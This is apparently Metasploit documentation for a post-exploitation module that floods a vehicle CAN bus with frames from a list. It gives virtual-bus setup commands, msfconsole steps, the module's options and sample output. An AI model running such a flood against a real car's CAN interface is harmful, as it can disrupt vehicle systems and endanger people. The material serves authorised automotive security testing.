## Introduction
CAN Flood is a post-exploitation module that floods a CAN interface for a number of rounds. Both the interface and the number of rounds are to be provided as inputs. An example list of frames also is part of the inputs, and sources the flooding at each round. The module therefore is general as it is parametric in the frame list.
## Verification Steps
First, start up a virtual CAN bus:
1. `sudo modprobe can`
2. `sudo modprobe vcan`
3. `sudo ip link add dev vcan0 type vcan`
4. `sudo ip link set up vcan0`

Then do the thing:
5. Start `msfconsole`
6. `use auxiliary/server/local_hwbridge`
7. `set uripath trycanbus`
8. `run`
9. `use auxiliary/client/hwbridge/connect`
10. `set targeturi trycanbus`
11. `run`
12. `use post/hardware/automotive/can_flood`
13. `set canbus vcan0`
14. `set session 1`
15. `run`
## Options
**CANBUS**
Determines which CAN interface to use.

**FRAMELIST**
Path of the file that contains the list of frames. Default is "/usr/share/metasploit-framework/data/wordlists/frameListCanBus.txt".

**ROUNDS**
Number of executed rounds. Default is 200.

**SESSION**
The session to run this module on.
## Scenarios
The user must know a list of frames that generate an effect on the car. This is because the module is general as it is parametric in the frame list.
You can test the module by setting a virtual CAN interface and then execute the commands, thus obtaining the underlying output:
```
msf5 > use auxiliary/server/local_hwbridge
msf5 auxiliary(server/local_hwbridge) > run
[*] Auxiliary module running as background job 0.

[*] Using URL: http://0.0.0.0:8080/trycanbus
[*] Local IP: http://10.0.2.15:8080/trycanbus
[*] Server started.
msf5 auxiliary(server/local_hwbridge) > use auxiliary/client/hwbridge/connect
msf5 auxiliary(client/hwbridge/connect) > set targeturi trycanbus
targeturi => trycanbus
msf5 auxiliary(client/hwbridge/connect) > run

[*] Attempting to connect to 127.0.0.1...
[*] Hardware bridge interface session 1 opened (127.0.0.1 -> 127.0.0.1) at 2019-03-20 03:17:55 -0400
[+] HWBridge session established
[*] HW Specialty: {"automotive"=>true}  Capabilities: {"can"=>true, "custom_methods"=>true}
[!] NOTICE:  You are about to leave the matrix.  All actions performed on this hardware bridge
[!]          could have real world consequences.  Use this module in a controlled testing
[!]          environment and with equipment you are authorized to perform testing on.
[*] Auxiliary module execution completed
msf5 auxiliary(client/hwbridge/connect) > use post/hardware/automotive/can_flood 
msf5 post(hardware/automotive/can_flood) > set canbus vcan0
canbus => vcan0
msf5 post(hardware/automotive/can_flood) > set session 1
session => 1
msf5 post(hardware/automotive/can_flood) > run

[*]  -- FLOODING -- 
[*] Post module execution completed
```